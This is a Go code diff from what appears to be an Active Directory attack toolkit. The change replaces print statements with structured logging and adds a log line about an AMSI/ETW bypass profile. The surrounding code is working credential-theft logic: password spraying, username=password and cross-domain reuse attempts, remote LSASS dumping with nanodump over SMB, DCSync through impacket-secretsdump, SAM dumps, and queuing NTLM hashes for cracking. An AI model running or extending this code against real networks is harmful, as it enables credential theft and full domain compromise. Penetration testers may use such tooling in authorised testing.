@@ -6,6 +6,7 @@ import (
 	"adpack/utils"
 	"context"
 	"fmt"
+	"log/slog"
 	"os"
 	"strings"
 	"time"
@@ -77,7 +78,7 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 	if domain == "" {
 		return result
 	}
-	fmt.Println("[*] Password spraying known weak credentials...")
+	slog.Debug("Password spraying known weak credentials...")
 
 	existing := make(map[string]bool)
 	for _, c := range state.Creds {
@@ -110,8 +111,7 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 				continue
 			}
 			if strings.Contains(cr.Stdout, "[+]") {
-				fmt.Printf("[+] Spray: %s\\%s:%s valid on %s\n",
-					domain, wp.Username, wp.Password, host.IP)
+				slog.Info("Spray: credential valid", "domain", domain, "username", wp.Username, "host", host.IP)
 				cred := core.Credential{
 					Type:      core.CredPlaintext,
 					Username:  wp.Username,
@@ -134,7 +134,7 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 	}
 
 	// Username=password spray for each enumerated user
-	fmt.Println("[*] Trying username=password combinations...")
+	slog.Debug("Trying username=password combinations...")
 	for _, u := range state.Users {
 		key := domain + "\\" + u.Username
 		if existing[key] {
@@ -149,8 +149,7 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 				"-u", u.Username,
 				"-p", u.Username)
 			if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "[+]") {
-				fmt.Printf("[+] Username=Password: %s\\%s valid on %s\n",
-					domain, u.Username, host.IP)
+				slog.Info("Username=Password: credential valid", "domain", domain, "username", u.Username, "host", host.IP)
 				cred := core.Credential{
 					Type: core.CredPlaintext, Username: u.Username,
 					Domain: domain, Secret: u.Username,
@@ -169,7 +168,7 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 	}
 
 	// Cross-domain password reuse: try known credentials against other domains
-	fmt.Println("[*] Testing cross-domain password reuse...")
+	slog.Debug("Testing cross-domain password reuse...")
 	for _, cred := range state.Creds {
 		if cred.Secret == "" || cred.Username == "" {
 			continue
@@ -187,8 +186,7 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 				"-u", cred.Username,
 				"-p", cred.Secret)
 			if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "[+]") {
-				fmt.Printf("[+] Cross-domain reuse: %s\\%s valid on %s (%s)\n",
-					host.Domain, cred.Username, host.IP, host.Domain)
+				slog.Info("Cross-domain reuse: credential valid", "domain", host.Domain, "username", cred.Username, "host", host.IP)
 				newCred := core.Credential{
 					Type: core.CredPlaintext, Username: cred.Username,
 					Domain: host.Domain, Secret: cred.Secret,
@@ -206,9 +204,9 @@ func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
 	}
 
 	if len(result.Creds) > 0 {
-		fmt.Printf("[+] Spray: %d credential(s) found\n", len(result.Creds))
+		slog.Info("Spray: credential(s) found", "count", len(result.Creds))
 	} else {
-		fmt.Println("[i] Spray: no weak credentials found")
+		slog.Info("Spray: no weak credentials found")
 	}
 	return result
 }
@@ -231,7 +229,7 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 		}
 	}
 
-	fmt.Printf("[*] Spraying with %s\\%s\n", domain, user)
+	slog.Debug("Spraying with credential", "domain", domain, "username", user)
 
 	// Non-privileged: password spray, username=password, cross-domain reuse
 	sprayResult := runPasswordSpray(state, domain)
@@ -263,7 +261,11 @@ func RunCredentialAcqPipeline(state *core.ADState, profileName string, targetHos
 		pipeline = acquisitionPipelines["standard"]
 	}
 
-	fmt.Printf("[*] Using evasion profile: %s (%s)\n", profile.Name, profile.Description)
+	slog.Debug("Using evasion profile", "profile", profile.Name, "description", profile.Description)
+
+	if profileName == "native" {
+		slog.Debug("profile includes AMSI/ETW bypass", "profile", profileName)
+	}
 
 	host, found := selectTarget(state, targetHost)
 	if !found {
@@ -277,15 +279,15 @@ func RunCredentialAcqPipeline(state *core.ADState, profileName string, targetHos
 		}
 	}
 
-	fmt.Printf("[*] Target: %s (%s)\n", host.IP, host.Hostname)
+	slog.Debug("Target", "ip", host.IP, "hostname", host.Hostname)
 
-	fmt.Println("[*] LSASS dump via nanodump...")
+	slog.Debug("LSASS dump via nanodump...")
 
 	result := executeNanodumpPipeline(state, host, pipeline, exec)
 
 	// Fallback: nanodump failed; try impacket-secretsdump DCSync
 	if !result.Success && len(result.Evidence) > 0 && !strings.Contains(result.Evidence[0].Value, "secretsdump") {
-		fmt.Println("[*] nanodump failed, trying DCSync via impacket-secretsdump...")
+		slog.Debug("nanodump failed, trying DCSync via impacket-secretsdump...")
 		dcHost := host
 		if dc := findDC(state, host.Domain); dc.IP != "" {
 			dcHost = dc
@@ -298,7 +300,7 @@ func RunCredentialAcqPipeline(state *core.ADState, profileName string, targetHos
 
 	// Fallback: try SAM dump via nxc
 	if !result.Success {
-		fmt.Println("[*] Trying SAM dump via nxc...")
+		slog.Debug("Trying SAM dump via nxc...")
 		samResult := executeSAMDump(state, host)
 		if samResult.Success {
 			return samResult
@@ -441,14 +443,14 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	ctx := context.Background()
 
 	if pipeline.RemoteExec && domain != "" && pass != "" {
-		fmt.Printf("[*] Deploying nanodump.exe to %s via SMB...\n", host.IP)
+		slog.Debug("Deploying nanodump.exe to host via SMB", "ip", host.IP)
 		remoteDir := `C:\Windows\Temp\`
 		deployR := exec.Execute(ctx, core.Action{
 			Artifact: "nanodump.exe", Method: "put",
 			Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
 		})
 		if !deployR.Success {
-			fmt.Println("[!] Failed to deploy nanodump.exe")
+			slog.Warn("Failed to deploy nanodump.exe")
 			result.Success = false
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
@@ -473,12 +475,12 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 			exec.Execute(ctx, core.Action{
 				Method: "cleanup", Arguments: []string{ndPath, dumpRemote}, Timeout: 15 * time.Second,
 			})
-			fmt.Println("[!] nanodump remote execution failed")
+			slog.Warn("nanodump remote execution failed")
 			result.Success = false
 			return result
 		}
 
-		fmt.Println("[*] Retrieving dump via SMB...")
+		slog.Debug("Retrieving dump via SMB...")
 		localPath := fmt.Sprintf("/tmp/lsass_remote_%d.dmp", time.Now().Unix())
 		getR := exec.Execute(ctx, core.Action{
 			Artifact: dumpRemote, Method: "get",
@@ -491,7 +493,7 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 
 		if getR.Success {
 			defer os.Remove(localPath)
-			fmt.Printf("[*] Parsing dump with pypykatz...\n")
+			slog.Debug("Parsing dump with pypykatz...")
 			parsed, err := tools.Nanodump.ParseDump(ctx, localPath)
 			if err != nil {
 				pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localPath)
@@ -506,7 +508,7 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 							Timestamp: time.Now(),
 						})
 					}
-					fmt.Printf("[+] nanodump: %d credential(s) from %s\n", len(creds), host.IP)
+					slog.Info("nanodump: credential(s) from host", "count", len(creds), "host", host.IP)
 				}
 			} else if parsed.Success {
 				creds := pipeline.ParseFn(parsed.Stdout)
@@ -519,13 +521,13 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 						Timestamp: time.Now(),
 					})
 				}
-				fmt.Printf("[+] nanodump: %d credential(s) from %s\n", len(creds), host.IP)
+				slog.Info("nanodump: credential(s) from host", "count", len(creds), "host", host.IP)
 			}
 		}
 		return result
 	}
 
-	fmt.Println("[*] Running nanodump locally...")
+	slog.Debug("Running nanodump locally...")
 	r, err := tools.Nanodump.Run(ctx, tools.ExecutionRequest{
 		Evasion: "fork",
 	})
@@ -621,7 +623,7 @@ func executeSAMDump(state *core.ADState, host core.Host) *core.ToolResult {
 			Source: "nxc_sam", Key: host.IP, Value: "SAM dump completed",
 			Timestamp: time.Now(),
 		})
-		fmt.Println("[+] SAM dump successful")
+		slog.Info("SAM dump successful")
 	} else {
 		result.Success = false
 	}
@@ -636,7 +638,7 @@ func executeSecretsdumpPipeline(state *core.ADState, host core.Host) *core.ToolR
 		return result
 	}
 
-	fmt.Printf("[*] DCSync via impacket-secretsdump against %s...\n", host.IP)
+	slog.Debug("DCSync via impacket-secretsdump against host", "host", host.IP)
 	target := fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, host.IP)
 	args := []string{target, "-just-dc"}
 	r := utils.RunCommand("impacket-secretsdump", args...)
@@ -655,10 +657,10 @@ func executeSecretsdumpPipeline(state *core.ADState, host core.Host) *core.ToolR
 				EnqueueHash("ntlm", c.Hash, c.Username, c.Domain)
 			}
 		}
-		fmt.Printf("[+] Secretsdump: %d credentials found\n", len(creds))
+		slog.Info("Secretsdump: credentials found", "count", len(creds))
 	} else {
 		result.Success = false
-		fmt.Printf("[!] Secretsdump failed: %s\n", r.Stderr)
+		slog.Warn("Secretsdump failed", "error", r.Stderr)
 	}
 	return result
 }
